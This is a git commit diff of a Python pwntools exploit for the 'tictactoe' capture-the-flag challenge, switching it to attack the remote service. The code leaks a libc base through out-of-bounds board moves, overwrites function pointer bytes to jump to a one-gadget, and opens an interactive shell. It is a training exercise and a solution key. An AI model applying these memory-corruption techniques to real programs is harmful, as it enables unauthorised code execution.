7cbdf963b8557c2d4e553c7982b5f740f4b15e63
niexinming <993025447@qq.com>
2017-12-12 21:19:32 -0800

    solve remote tictactoe

--- mytictactoe.py
+++ mytictactoe.py
@@ -8,10 +8,10 @@ from termios import tcflush, TCIFLUSH
 
 context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')
 
-localMAGIC = 0x3ac5c      #locallibc
-remoteMAGIC = 0x3ac3e      #remotelibc   #libc6_2.23-0ubuntu3_i386.so
+localMAGIC = 0x3AC69      #locallibc
+remoteMAGIC = 0x3ac49      #remotelibc   #libc6_2.23-0ubuntu3_i386.so
 
-def debug(addr = '0x08048d03'):
+def debug(addr = '0x08048CF2'):
     raw_input('debug:')
     gdb.attach(io, "b *" + addr)
 
@@ -21,23 +21,24 @@ def base_addr(prog_addr,offset):
 def input_number(number):
     io.recv(timeout=5)
     io.sendline('9')
-    #time.sleep(1)
-    tcflush(sys.stdin, TCIFLUSH)
+    #tcflush(sys.stdin, TCIFLUSH)
     io.send(number)
     time.sleep(1)
-    tcflush(sys.stdin, TCIFLUSH)
+    sys.stdout.flush()
+    #tcflush(sys.stdin, TCIFLUSH)
 def input_addr(addr):
     io.recvuntil('Input move (9 to change flavor): ',timeout=5)
     io.sendline(addr)
-    time.sleep(1)
-    tcflush(sys.stdin, TCIFLUSH)
+    sys.stdout.flush()
+    #time.sleep(1)
+    #tcflush(sys.stdin, TCIFLUSH)
 
 
-elf = ELF('/home/h11p/ctf/tictactoe')
+elf = ELF('/home/h11p/hackme/tictactoe')
 
 
-io = process('/home/h11p/ctf/tictactoe')
-#io = remote('hackme.inndy.tw', 7714)
+#io = process('/home/h11p/hackme/tictactoe')
+io = remote('hackme.inndy.tw', 7714)
 #debug()
 io.recvuntil('Play (1)st or (2)nd? ')
 io.sendline('1')
@@ -79,20 +80,23 @@ input_number(p32(0xff))
 input_addr('-7')
 
 #leak libc_base
-libc_leak=io.recv().splitlines()[1][19:23]
+libc_leak=io.recv(timeout=5).splitlines()[1][19:23]
 libc_leak=u32(libc_leak)
 print hex(libc_leak)
 libc_base=libc_leak-0x3f12
 print "libc_base:"+hex(libc_base)
-MAGIC_addr=libc_base+localMAGIC
+
+#MAGIC_addr=libc_base+localMAGIC
+MAGIC_addr=libc_base+remoteMAGIC
 print "MAGIC_addr:"+hex(MAGIC_addr)
 
 #unsuccess get flag
 input_number(p32(1))
 input_addr('-8')
 
+
 #change open to exit
-input_number(p32(0xf2))
+input_number(p32(0xce))
 input_addr('-42')
 input_number(p32(0x8c))
 input_addr('-41')
@@ -113,6 +117,7 @@ for i in Bytes_MAGIC_addr[::-1]:
 #success get flag
 input_number(p32(0xff))
 input_addr('-8')
+
 
 io.interactive()
 #io.recv()
